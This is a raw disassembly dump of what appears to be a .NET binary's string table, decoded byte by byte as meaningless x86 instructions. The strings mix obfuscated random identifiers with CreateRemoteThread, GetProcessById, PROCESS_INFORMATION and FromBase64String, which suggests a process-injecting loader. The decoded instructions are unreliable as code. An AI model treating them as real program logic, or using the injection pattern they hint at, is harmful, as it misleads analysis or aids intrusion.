10002bae:	65 3e 00 42 57       	gs add %al,%ds:0x57(%edx)
10002bb3:	6e                   	outsb  %ds:(%esi),(%dx)
10002bb4:	44                   	inc    %esp
10002bb5:	48                   	dec    %eax
10002bb6:	4a                   	dec    %edx
10002bb7:	49                   	dec    %ecx
10002bb8:	66 62 53 57          	bound  %dx,0x57(%ebx)
10002bbc:	6c                   	insb   (%dx),%es:(%edi)
10002bbd:	36 70 55             	ss jo  0x10002c15
10002bc0:	6a 43                	push   $0x43
10002bc2:	4f                   	dec    %edi
10002bc3:	33 43 00             	xor    0x0(%ebx),%eax
10002bc6:	59                   	pop    %ecx
10002bc7:	66 72 5a             	data16 jb 0x10002c24
10002bca:	46                   	inc    %esi
10002bcb:	52                   	push   %edx
10002bcc:	68 65 42 45 6c       	push   $0x6c454265
10002bd1:	6c                   	insb   (%dx),%es:(%edi)
10002bd2:	47                   	inc    %edi
10002bd3:	43                   	inc    %ebx
10002bd4:	4b                   	dec    %ebx
10002bd5:	7a 58                	jp     0x10002c2f
10002bd7:	76 6b                	jbe    0x10002c44
10002bd9:	73 34                	jae    0x10002c0f
10002bdb:	65 44                	gs inc %esp
10002bdd:	34 43                	xor    $0x43,%al
10002bdf:	00 58 6c             	add    %bl,0x6c(%eax)
10002be2:	71 50                	jno    0x10002c34
10002be4:	6a 43                	push   $0x43
10002be6:	6d                   	insl   (%dx),%es:(%edi)
10002be7:	4f                   	dec    %edi
10002be8:	4d                   	dec    %ebp
10002be9:	36 4e                	ss dec %esi
10002beb:	59                   	pop    %ecx
10002bec:	6f                   	outsl  %ds:(%esi),(%dx)
10002bed:	33 58 31             	xor    0x31(%eax),%ebx
10002bf0:	7a 72                	jp     0x10002c64
10002bf2:	43                   	inc    %ebx
10002bf3:	00 50 72             	add    %dl,0x72(%eax)
10002bf6:	74 57                	je     0x10002c4f
10002bf8:	46                   	inc    %esi
10002bf9:	6e                   	outsb  %ds:(%esi),(%dx)
10002bfa:	6b 75 74 30          	imul   $0x30,0x74(%ebp),%esi
10002bfe:	65 67 61             	gs addr16 popa
10002c01:	79 4f                	jns    0x10002c52
10002c03:	31 48 44             	xor    %ecx,0x44(%eax)
10002c06:	00 4e 58             	add    %cl,0x58(%esi)
10002c09:	4e                   	dec    %esi
10002c0a:	57                   	push   %edi
10002c0b:	79 7a                	jns    0x10002c87
10002c0d:	6e                   	outsb  %ds:(%esi),(%dx)
10002c0e:	51                   	push   %ecx
10002c0f:	55                   	push   %ebp
10002c10:	79 6c                	jns    0x10002c7e
10002c12:	74 4e                	je     0x10002c62
10002c14:	63 77 54             	arpl   %esi,0x54(%edi)
10002c17:	41                   	inc    %ecx
10002c18:	67 73 65             	addr16 jae 0x10002c80
10002c1b:	44                   	inc    %esp
10002c1c:	00 48 75             	add    %cl,0x75(%eax)
10002c1f:	45                   	inc    %ebp
10002c20:	61                   	popa
10002c21:	4a                   	dec    %edx
10002c22:	4d                   	dec    %ebp
10002c23:	5a                   	pop    %edx
10002c24:	59                   	pop    %ecx
10002c25:	53                   	push   %ebx
10002c26:	48                   	dec    %eax
10002c27:	73 6b                	jae    0x10002c94
10002c29:	59                   	pop    %ecx
10002c2a:	45                   	inc    %ebp
10002c2b:	00 52 42             	add    %dl,0x42(%edx)
10002c2e:	53                   	push   %ebx
10002c2f:	67 69 58 52 65 70 7a 	imul   $0x637a7065,0x52(%bx,%si),%ebx
10002c36:	63 
10002c37:	31 43 55             	xor    %eax,0x55(%ebx)
10002c3a:	7a 52                	jp     0x10002c8e
10002c3c:	41                   	inc    %ecx
10002c3d:	4f                   	dec    %edi
10002c3e:	70 45                	jo     0x10002c85
10002c40:	00 49 76             	add    %cl,0x76(%ecx)
10002c43:	62 62 48             	bound  %esp,0x48(%edx)
10002c46:	73 59                	jae    0x10002ca1
10002c48:	77 4a                	ja     0x10002c94
10002c4a:	67 50                	addr16 push %eax
10002c4c:	66 59                	pop    %cx
10002c4e:	53                   	push   %ebx
10002c4f:	59                   	pop    %ecx
10002c50:	4b                   	dec    %ebx
10002c51:	49                   	dec    %ecx
10002c52:	38 46 00             	cmp    %al,0x0(%esi)
10002c55:	4d                   	dec    %ebp
10002c56:	44                   	inc    %esp
10002c57:	41                   	inc    %ecx
10002c58:	74 76                	je     0x10002cd0
10002c5a:	4a                   	dec    %edx
10002c5b:	56                   	push   %esi
10002c5c:	4f                   	dec    %edi
10002c5d:	47                   	inc    %edi
10002c5e:	73 6c                	jae    0x10002ccc
10002c60:	6d                   	insl   (%dx),%es:(%edi)
10002c61:	56                   	push   %esi
10002c62:	31 6c 48 00          	xor    %ebp,0x0(%eax,%ecx,2)
10002c66:	50                   	push   %eax
10002c67:	4d                   	dec    %ebp
10002c68:	6c                   	insb   (%dx),%es:(%edi)
10002c69:	70 78                	jo     0x10002ce3
10002c6b:	6e                   	outsb  %ds:(%esi),(%dx)
10002c6c:	41                   	inc    %ecx
10002c6d:	57                   	push   %edi
10002c6e:	48                   	dec    %eax
10002c6f:	53                   	push   %ebx
10002c70:	54                   	push   %esp
10002c71:	36 36 78 62          	ss ss js 0x10002cd7
10002c75:	59                   	pop    %ecx
10002c76:	38 36                	cmp    %dh,(%esi)
10002c78:	31 6a 30             	xor    %ebp,0x30(%edx)
10002c7b:	52                   	push   %edx
10002c7c:	70 4a                	jo     0x10002cc8
10002c7e:	00 49 55             	add    %cl,0x55(%ecx)
10002c81:	47                   	inc    %edi
10002c82:	6c                   	insb   (%dx),%es:(%edi)
10002c83:	6b 4f 42 4f          	imul   $0x4f,0x42(%edi),%ecx
10002c87:	42                   	inc    %edx
10002c88:	4c                   	dec    %esp
10002c89:	41                   	inc    %ecx
10002c8a:	54                   	push   %esp
10002c8b:	39 78 6b             	cmp    %edi,0x6b(%eax)
10002c8e:	31 4e 65             	xor    %ecx,0x65(%esi)
10002c91:	30 4e 00             	xor    %cl,0x0(%esi)
10002c94:	50                   	push   %eax
10002c95:	52                   	push   %edx
10002c96:	4f                   	dec    %edi
10002c97:	43                   	inc    %ebx
10002c98:	45                   	inc    %ebp
10002c99:	53                   	push   %ebx
10002c9a:	53                   	push   %ebx
10002c9b:	5f                   	pop    %edi
10002c9c:	49                   	dec    %ecx
10002c9d:	4e                   	dec    %esi
10002c9e:	46                   	inc    %esi
10002c9f:	4f                   	dec    %edi
10002ca0:	52                   	push   %edx
10002ca1:	4d                   	dec    %ebp
10002ca2:	41                   	inc    %ecx
10002ca3:	54                   	push   %esp
10002ca4:	49                   	dec    %ecx
10002ca5:	4f                   	dec    %edi
10002ca6:	4e                   	dec    %esi
10002ca7:	00 53 54             	add    %dl,0x54(%ebx)
10002caa:	41                   	inc    %ecx
10002cab:	52                   	push   %edx
10002cac:	54                   	push   %esp
10002cad:	55                   	push   %ebp
10002cae:	50                   	push   %eax
10002caf:	49                   	dec    %ecx
10002cb0:	4e                   	dec    %esi
10002cb1:	46                   	inc    %esi
10002cb2:	4f                   	dec    %edi
10002cb3:	00 53 79             	add    %dl,0x79(%ebx)
10002cb6:	73 74                	jae    0x10002d2c
10002cb8:	65 6d                	gs insl (%dx),%es:(%edi)
10002cba:	2e 49                	cs dec %ecx
10002cbc:	4f                   	dec    %edi
10002cbd:	00 45 48             	add    %al,0x48(%ebp)
10002cc0:	62 72 77             	bound  %esi,0x77(%edx)
10002cc3:	47                   	inc    %edi
10002cc4:	51                   	push   %ecx
10002cc5:	75 48                	jne    0x10002d0f
10002cc7:	73 78                	jae    0x10002d41
10002cc9:	52                   	push   %edx
10002cca:	44                   	inc    %esp
10002ccb:	59                   	pop    %ecx
10002ccc:	57                   	push   %edi
10002ccd:	51                   	push   %ecx
10002cce:	00 55 71             	add    %dl,0x71(%ebp)
10002cd1:	6a 46                	push   $0x46
10002cd3:	74 62                	je     0x10002d37
10002cd5:	74 55                	je     0x10002d2c
10002cd7:	76 74                	jbe    0x10002d4d
10002cd9:	31 69 6b             	xor    %ebp,0x6b(%ecx)
10002cdc:	51                   	push   %ecx
10002cdd:	00 52 4f             	add    %dl,0x4f(%edx)
10002ce0:	4d                   	dec    %ebp
10002ce1:	4e                   	dec    %esi
10002ce2:	41                   	inc    %ecx
10002ce3:	52                   	push   %edx
10002ce4:	46                   	inc    %esi
10002ce5:	6e                   	outsb  %ds:(%esi),(%dx)
10002ce6:	5a                   	pop    %edx
10002ce7:	70 5a                	jo     0x10002d43
10002ce9:	30 37                	xor    %dh,(%edi)
10002ceb:	6f                   	outsl  %ds:(%esi),(%dx)
10002cec:	30 77 78             	xor    %dh,0x78(%edi)
10002cef:	75 67                	jne    0x10002d58
10002cf1:	4f                   	dec    %edi
10002cf2:	30 66 37             	xor    %ah,0x37(%esi)
10002cf5:	53                   	push   %ebx
10002cf6:	00 48 46             	add    %cl,0x46(%eax)
10002cf9:	72 6d                	jb     0x10002d68
10002cfb:	64 78 4d             	fs js  0x10002d4b
10002cfe:	5a                   	pop    %edx
10002cff:	30 35 65 68 46 49    	xor    %dh,0x49466865
10002d05:	41                   	inc    %ecx
10002d06:	54                   	push   %esp
10002d07:	6b 5a 7a 43          	imul   $0x43,0x7a(%edx),%ebx
10002d0b:	67 39 70 50          	cmp    %esi,0x50(%bx,%si)
10002d0f:	53                   	push   %ebx
10002d10:	00 49 4d             	add    %cl,0x4d(%ecx)
10002d13:	43                   	inc    %ebx
10002d14:	6e                   	outsb  %ds:(%esi),(%dx)
10002d15:	4d                   	dec    %ebp
10002d16:	69 69 4f 4e 62 52 48 	imul   $0x4852624e,0x4f(%ecx),%ebp
10002d1d:	5a                   	pop    %edx
10002d1e:	64 55                	fs push %ebp
10002d20:	55                   	push   %ebp
10002d21:	00 59 6d             	add    %bl,0x6d(%ecx)
10002d24:	74 44                	je     0x10002d6a
10002d26:	55                   	push   %ebp
10002d27:	4a                   	dec    %edx
10002d28:	53                   	push   %ebx
10002d29:	64 39 59 59          	cmp    %ebx,%fs:0x59(%ecx)
10002d2d:	41                   	inc    %ecx
10002d2e:	72 73                	jb     0x10002da3
10002d30:	37                   	aaa
10002d31:	43                   	inc    %ebx
10002d32:	35 55 64 73 45       	xor    $0x45736455,%eax
10002d37:	53                   	push   %ebx
10002d38:	56                   	push   %esi
10002d39:	00 4d 47             	add    %cl,0x47(%ebp)
10002d3c:	74 57                	je     0x10002d95
10002d3e:	57                   	push   %edi
10002d3f:	49                   	dec    %ecx
10002d40:	50                   	push   %eax
10002d41:	57                   	push   %edi
10002d42:	54                   	push   %esp
10002d43:	4e                   	dec    %esi
10002d44:	32 51 78             	xor    0x78(%ecx),%dl
10002d47:	4b                   	dec    %ebx
10002d48:	62 64 73 57          	bound  %esp,0x57(%ebx,%esi,2)
10002d4c:	6d                   	insl   (%dx),%es:(%edi)
10002d4d:	32 32                	xor    (%edx),%dh
10002d4f:	57                   	push   %edi
10002d50:	00 45 57             	add    %al,0x57(%ebp)
10002d53:	4c                   	dec    %esp
10002d54:	6d                   	insl   (%dx),%es:(%edi)
10002d55:	4b                   	dec    %ebx
10002d56:	57                   	push   %edi
10002d57:	4d                   	dec    %ebp
10002d58:	35 62 4f 4e 4b       	xor    $0x4b4e4f62,%eax
10002d5d:	6f                   	outsl  %ds:(%esi),(%dx)
10002d5e:	47                   	inc    %edi
10002d5f:	57                   	push   %edi
10002d60:	00 46 46             	add    %al,0x46(%esi)
10002d63:	6c                   	insb   (%dx),%es:(%edi)
10002d64:	65 68 63 62 73 47    	gs push $0x47736263
10002d6a:	48                   	dec    %eax
10002d6b:	56                   	push   %esi
10002d6c:	50                   	push   %eax
10002d6d:	68 6c 6e 61 4d       	push   $0x4d616e6c
10002d72:	68 5a 71 65 70       	push   $0x7065715a
10002d77:	58                   	pop    %eax
10002d78:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10002d7c:	00 5a 74             	add    %bl,0x74(%edx)
10002d7f:	69 6f 52 44 36 57 54 	imul   $0x54573644,0x52(%edi),%ebp
10002d86:	75 4e                	jne    0x10002dd6
10002d88:	49                   	dec    %ecx
10002d89:	4e                   	dec    %esi
10002d8a:	6b 59 00 64          	imul   $0x64,0x0(%ecx),%ebx
10002d8e:	77 59                	ja     0x10002de9
10002d90:	00 54 6a 58          	add    %dl,0x58(%edx,%ebp,2)
10002d94:	6a 51                	push   $0x51
10002d96:	75 32                	jne    0x10002dca
10002d98:	50                   	push   %eax
10002d99:	67 67 4b             	addr16 addr16 dec %ebx
10002d9c:	78 77                	js     0x10002e15
10002d9e:	6e                   	outsb  %ds:(%esi),(%dx)
10002d9f:	32 65 43             	xor    0x43(%ebp),%ah
10002da2:	34 49                	xor    $0x49,%al
10002da4:	53                   	push   %ebx
10002da5:	5a                   	pop    %edx
10002da6:	00 57 64             	add    %dl,0x64(%edi)
10002da9:	54                   	push   %esp
10002daa:	76 4f                	jbe    0x10002dfb
10002dac:	4e                   	dec    %esi
10002dad:	75 5a                	jne    0x10002e09
10002daf:	31 53 33             	xor    %edx,0x33(%ebx)
10002db2:	33 6f 47             	xor    0x47(%edi),%ebp
10002db5:	6e                   	outsb  %ds:(%esi),(%dx)
10002db6:	57                   	push   %edi
10002db7:	58                   	pop    %eax
10002db8:	6c                   	insb   (%dx),%es:(%edi)
10002db9:	61                   	popa
10002dba:	67 44                	addr16 inc %esp
10002dbc:	62 00                	bound  %eax,(%eax)
10002dbe:	63 62 00             	arpl   %esp,0x0(%edx)
10002dc1:	57                   	push   %edi
10002dc2:	66 79 79             	data16 jns 0x10002e3e
10002dc5:	52                   	push   %edx
10002dc6:	55                   	push   %ebp
10002dc7:	65 54                	gs push %esp
10002dc9:	36 51                	ss push %ecx
10002dcb:	66 4d                	dec    %bp
10002dcd:	54                   	push   %esp
10002dce:	66 62 00             	bound  %ax,(%eax)
10002dd1:	6d                   	insl   (%dx),%es:(%edi)
10002dd2:	73 63                	jae    0x10002e37
10002dd4:	6f                   	outsl  %ds:(%esi),(%dx)
10002dd5:	72 6c                	jb     0x10002e43
10002dd7:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
10002dde:	65 6d                	gs insl (%dx),%es:(%edi)
10002de0:	2e 43                	cs inc %ebx
10002de2:	6f                   	outsl  %ds:(%esi),(%dx)
10002de3:	6c                   	insb   (%dx),%es:(%edi)
10002de4:	6c                   	insb   (%dx),%es:(%edi)
10002de5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002dea:	6e                   	outsb  %ds:(%esi),(%dx)
10002deb:	73 2e                	jae    0x10002e1b
10002ded:	47                   	inc    %edi
10002dee:	65 6e                	outsb  %gs:(%esi),(%dx)
10002df0:	65 72 69             	gs jb  0x10002e5c
10002df3:	63 00                	arpl   %eax,(%eax)
10002df5:	47                   	inc    %edi
10002df6:	65 74 50             	gs je  0x10002e49
10002df9:	72 6f                	jb     0x10002e6a
10002dfb:	63 65 73             	arpl   %esp,0x73(%ebp)
10002dfe:	73 42                	jae    0x10002e42
10002e00:	79 49                	jns    0x10002e4b
10002e02:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002e06:	74 45                	je     0x10002e4d
10002e08:	78 69                	js     0x10002e73
10002e0a:	74 43                	je     0x10002e4f
10002e0c:	6f                   	outsl  %ds:(%esi),(%dx)
10002e0d:	64 65 54             	fs gs push %esp
10002e10:	68 72 65 61 64       	push   $0x64616572
10002e15:	00 43 72             	add    %al,0x72(%ebx)
10002e18:	65 61                	gs popa
10002e1a:	74 65                	je     0x10002e81
10002e1c:	52                   	push   %edx
10002e1d:	65 6d                	gs insl (%dx),%es:(%edi)
10002e1f:	6f                   	outsl  %ds:(%esi),(%dx)
10002e20:	74 65                	je     0x10002e87
10002e22:	54                   	push   %esp
10002e23:	68 72 65 61 64       	push   $0x64616572
10002e28:	00 41 64             	add    %al,0x64(%ecx)
10002e2b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10002e2f:	74 5f                	je     0x10002e90
10002e31:	48                   	dec    %eax
10002e32:	61                   	popa
10002e33:	73 45                	jae    0x10002e7a
10002e35:	78 69                	js     0x10002ea0
10002e37:	74 65                	je     0x10002e9e
10002e39:	64 00 55 65          	add    %dl,%fs:0x65(%ebp)
10002e3d:	72 63                	jb     0x10002ea2
10002e3f:	73 6b                	jae    0x10002eac
10002e41:	45                   	inc    %ebp
10002e42:	75 66                	jne    0x10002eaa
10002e44:	6c                   	insb   (%dx),%es:(%edi)
10002e45:	5a                   	pop    %edx
10002e46:	61                   	popa
10002e47:	42                   	inc    %edx
10002e48:	73 61                	jae    0x10002eab
10002e4a:	6b 4d 50 65          	imul   $0x65,0x50(%ebp),%ecx
10002e4e:	00 52 65             	add    %dl,0x65(%edx)
10002e51:	70 6c                	jo     0x10002ebf
10002e53:	61                   	popa
10002e54:	63 65 00             	arpl   %esp,0x0(%ebp)
10002e57:	45                   	inc    %ebp
10002e58:	6e                   	outsb  %ds:(%esi),(%dx)
10002e59:	75 6d                	jne    0x10002ec8
10002e5b:	65 72 61             	gs jb  0x10002ebf
10002e5e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10002e62:	43                   	inc    %ebx
10002e63:	6c                   	insb   (%dx),%es:(%edi)
10002e64:	6f                   	outsl  %ds:(%esi),(%dx)
10002e65:	73 65                	jae    0x10002ecc
10002e67:	48                   	dec    %eax
10002e68:	61                   	popa
10002e69:	6e                   	outsb  %ds:(%esi),(%dx)
10002e6a:	64 6c                	fs insb (%dx),%es:(%edi)
10002e6c:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10002e70:	6c                   	insb   (%dx),%es:(%edi)
10002e71:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002e75:	6c                   	insb   (%dx),%es:(%edi)
10002e76:	75 65                	jne    0x10002edd
10002e78:	54                   	push   %esp
10002e79:	79 70                	jns    0x10002eeb
10002e7b:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10002e7f:	65 72 65             	gs jb  0x10002ee7
10002e82:	00 53 79             	add    %dl,0x79(%ebx)
10002e85:	73 74                	jae    0x10002efb
10002e87:	65 6d                	gs insl (%dx),%es:(%edi)
10002e89:	2e 43                	cs inc %ebx
10002e8b:	6f                   	outsl  %ds:(%esi),(%dx)
10002e8c:	72 65                	jb     0x10002ef3
10002e8e:	00 43 6f             	add    %al,0x6f(%ebx)
10002e91:	6d                   	insl   (%dx),%es:(%edi)
10002e92:	70 69                	jo     0x10002efd
10002e94:	6c                   	insb   (%dx),%es:(%edi)
10002e95:	65 72 47             	gs jb  0x10002edf
10002e98:	65 6e                	outsb  %gs:(%esi),(%dx)
10002e9a:	65 72 61             	gs jb  0x10002efe
10002e9d:	74 65                	je     0x10002f04
10002e9f:	64 41                	fs inc %ecx
10002ea1:	74 74                	je     0x10002f17
10002ea3:	72 69                	jb     0x10002f0e
10002ea5:	62 75 74             	bound  %esi,0x74(%ebp)
10002ea8:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002eac:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002eb3:	62 
10002eb4:	75 74                	jne    0x10002f2a
10002eb6:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002ebb:	75 67                	jne    0x10002f24
10002ebd:	67 61                	addr16 popa
10002ebf:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002ec3:	74 74                	je     0x10002f39
10002ec5:	72 69                	jb     0x10002f30
10002ec7:	62 75 74             	bound  %esi,0x74(%ebp)
10002eca:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002ece:	6d                   	insl   (%dx),%es:(%edi)
10002ecf:	56                   	push   %esi
10002ed0:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002ed7:	74 74                	je     0x10002f4d
10002ed9:	72 69                	jb     0x10002f44
10002edb:	62 75 74             	bound  %esi,0x74(%ebp)
10002ede:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ee2:	73 65                	jae    0x10002f49
10002ee4:	6d                   	insl   (%dx),%es:(%edi)
10002ee5:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002ee9:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002ef0:	72 
10002ef1:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002ef8:	73 73                	jae    0x10002f6d
10002efa:	65 6d                	gs insl (%dx),%es:(%edi)
10002efc:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002f00:	72 61                	jb     0x10002f63
10002f02:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002f05:	61                   	popa
10002f06:	72 6b                	jb     0x10002f73
10002f08:	41                   	inc    %ecx
10002f09:	74 74                	je     0x10002f7f
10002f0b:	72 69                	jb     0x10002f76
10002f0d:	62 75 74             	bound  %esi,0x74(%ebp)
10002f10:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002f15:	67 65 74 46          	addr16 gs je 0x10002f5f
10002f19:	72 61                	jb     0x10002f7c
10002f1b:	6d                   	insl   (%dx),%es:(%edi)
10002f1c:	65 77 6f             	gs ja  0x10002f8e
10002f1f:	72 6b                	jb     0x10002f8c
10002f21:	41                   	inc    %ecx
10002f22:	74 74                	je     0x10002f98
10002f24:	72 69                	jb     0x10002f8f
10002f26:	62 75 74             	bound  %esi,0x74(%ebp)
10002f29:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f2d:	73 65                	jae    0x10002f94
10002f2f:	6d                   	insl   (%dx),%es:(%edi)
10002f30:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002f34:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002f3b:	69 
10002f3c:	6f                   	outsl  %ds:(%esi),(%dx)
10002f3d:	6e                   	outsb  %ds:(%esi),(%dx)
10002f3e:	41                   	inc    %ecx
10002f3f:	74 74                	je     0x10002fb5
10002f41:	72 69                	jb     0x10002fac
10002f43:	62 75 74             	bound  %esi,0x74(%ebp)
10002f46:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f4a:	73 65                	jae    0x10002fb1
10002f4c:	6d                   	insl   (%dx),%es:(%edi)
10002f4d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f51:	6f                   	outsl  %ds:(%esi),(%dx)
10002f52:	6e                   	outsb  %ds:(%esi),(%dx)
10002f53:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10002f59:	74 69                	je     0x10002fc4
10002f5b:	6f                   	outsl  %ds:(%esi),(%dx)
10002f5c:	6e                   	outsb  %ds:(%esi),(%dx)
10002f5d:	41                   	inc    %ecx
10002f5e:	74 74                	je     0x10002fd4
10002f60:	72 69                	jb     0x10002fcb
10002f62:	62 75 74             	bound  %esi,0x74(%ebp)
10002f65:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f69:	73 65                	jae    0x10002fd0
10002f6b:	6d                   	insl   (%dx),%es:(%edi)
10002f6c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002f70:	65 73 63             	gs jae 0x10002fd6
10002f73:	72 69                	jb     0x10002fde
10002f75:	70 74                	jo     0x10002feb
10002f77:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002f7e:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002f85:	6f                   	outsl  %ds:(%esi),(%dx)
10002f86:	6d                   	insl   (%dx),%es:(%edi)
10002f87:	70 69                	jo     0x10002ff2
10002f89:	6c                   	insb   (%dx),%es:(%edi)
10002f8a:	61                   	popa
10002f8b:	74 69                	je     0x10002ff6
10002f8d:	6f                   	outsl  %ds:(%esi),(%dx)
10002f8e:	6e                   	outsb  %ds:(%esi),(%dx)
10002f8f:	52                   	push   %edx
10002f90:	65 6c                	gs insb (%dx),%es:(%edi)
10002f92:	61                   	popa
10002f93:	78 61                	js     0x10002ff6
10002f95:	74 69                	je     0x10003000
10002f97:	6f                   	outsl  %ds:(%esi),(%dx)
10002f98:	6e                   	outsb  %ds:(%esi),(%dx)
10002f99:	73 41                	jae    0x10002fdc
10002f9b:	74 74                	je     0x10003011
10002f9d:	72 69                	jb     0x10003008
10002f9f:	62 75 74             	bound  %esi,0x74(%ebp)
10002fa2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002fa6:	73 65                	jae    0x1000300d
10002fa8:	6d                   	insl   (%dx),%es:(%edi)
10002fa9:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002fad:	72 6f                	jb     0x1000301e
10002faf:	64 75 63             	fs jne 0x10003015
10002fb2:	74 41                	je     0x10002ff5
10002fb4:	74 74                	je     0x1000302a
10002fb6:	72 69                	jb     0x10003021
10002fb8:	62 75 74             	bound  %esi,0x74(%ebp)
10002fbb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002fbf:	73 65                	jae    0x10003026
10002fc1:	6d                   	insl   (%dx),%es:(%edi)
10002fc2:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002fc6:	6f                   	outsl  %ds:(%esi),(%dx)
10002fc7:	70 79                	jo     0x10003042
10002fc9:	72 69                	jb     0x10003034
10002fcb:	67 68 74 41 74 74    	addr16 push $0x74744174
10002fd1:	72 69                	jb     0x1000303c
10002fd3:	62 75 74             	bound  %esi,0x74(%ebp)
10002fd6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002fda:	73 65                	jae    0x10003041
10002fdc:	6d                   	insl   (%dx),%es:(%edi)
10002fdd:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002fe1:	6f                   	outsl  %ds:(%esi),(%dx)
10002fe2:	6d                   	insl   (%dx),%es:(%edi)
10002fe3:	70 61                	jo     0x10003046
10002fe5:	6e                   	outsb  %ds:(%esi),(%dx)
10002fe6:	79 41                	jns    0x10003029
10002fe8:	74 74                	je     0x1000305e
10002fea:	72 69                	jb     0x10003055
10002fec:	62 75 74             	bound  %esi,0x74(%ebp)
10002fef:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002ff3:	6e                   	outsb  %ds:(%esi),(%dx)
10002ff4:	74 69                	je     0x1000305f
10002ff6:	6d                   	insl   (%dx),%es:(%edi)
10002ff7:	65 43                	gs inc %ebx
10002ff9:	6f                   	outsl  %ds:(%esi),(%dx)
10002ffa:	6d                   	insl   (%dx),%es:(%edi)
10002ffb:	70 61                	jo     0x1000305e
10002ffd:	74 69                	je     0x10003068
10002fff:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10003002:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10003009:	69 
1000300a:	62 75 74             	bound  %esi,0x74(%ebp)
1000300d:	65 00 48 78          	add    %cl,%gs:0x78(%eax)
10003011:	4d                   	dec    %ebp
10003012:	4e                   	dec    %esi
10003013:	6c                   	insb   (%dx),%es:(%edi)
10003014:	44                   	inc    %esp
10003015:	57                   	push   %edi
10003016:	6d                   	insl   (%dx),%es:(%edi)
10003017:	51                   	push   %ecx
10003018:	6c                   	insb   (%dx),%es:(%edi)
10003019:	6c                   	insb   (%dx),%es:(%edi)
1000301a:	38 72 75             	cmp    %dh,0x75(%edx)
1000301d:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
10003021:	7a 65                	jp     0x10003088
10003023:	4f                   	dec    %edi
10003024:	66 00 53 79          	data16 add %dl,0x79(%ebx)
10003028:	73 74                	jae    0x1000309e
1000302a:	65 6d                	gs insl (%dx),%es:(%edi)
1000302c:	2e 54                	cs push %esp
1000302e:	68 72 65 61 64       	push   $0x64616572
10003033:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
1000303a:	6f                   	outsl  %ds:(%esi),(%dx)
1000303b:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
10003042:	73 
10003043:	74 65                	je     0x100030aa
10003045:	6d                   	insl   (%dx),%es:(%edi)
10003046:	2e 52                	cs push %edx
10003048:	75 6e                	jne    0x100030b8
1000304a:	74 69                	je     0x100030b5
1000304c:	6d                   	insl   (%dx),%es:(%edi)
1000304d:	65 2e 56             	gs cs push %esi
10003050:	65 72 73             	gs jb  0x100030c6
10003053:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
1000305a:	46                   	inc    %esi
1000305b:	72 6f                	jb     0x100030cc
1000305d:	6d                   	insl   (%dx),%es:(%edi)
1000305e:	42                   	inc    %edx
1000305f:	61                   	popa
10003060:	73 65                	jae    0x100030c7
10003062:	36 34 53             	ss xor $0x53,%al
10003065:	74 72                	je     0x100030d9
10003067:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
1000306e:	53                   	push   %ebx
1000306f:	74 72                	je     0x100030e3
10003071:	69 6e 67 00 50 61 74 	imul   $0x74615000,0x67(%esi),%ebp
10003078:	68 00 4d 72 76       	push   $0x76724d00
1000307d:	64 75 4e             	fs jne 0x100030ce
10003080:	6d                   	insl   (%dx),%es:(%edi)
10003081:	58                   	pop    %eax
10003082:	33 42 31             	xor    0x31(%edx),%eax
10003085:	43                   	inc    %ebx
10003086:	33 59 5a             	xor    0x5a(%ecx),%ebx
10003089:	61                   	popa
1000308a:	58                   	pop    %eax
1000308b:	53                   	push   %ebx
1000308c:	58                   	pop    %eax
1000308d:	52                   	push   %edx
1000308e:	4e                   	dec    %esi
1000308f:	58                   	pop    %eax
10003090:	5a                   	pop    %edx
10003091:	6a 00                	push   $0x0
10003093:	50                   	push   %eax
10003094:	50                   	push   %eax
10003095:	5a                   	pop    %edx
10003096:	52                   	push   %edx
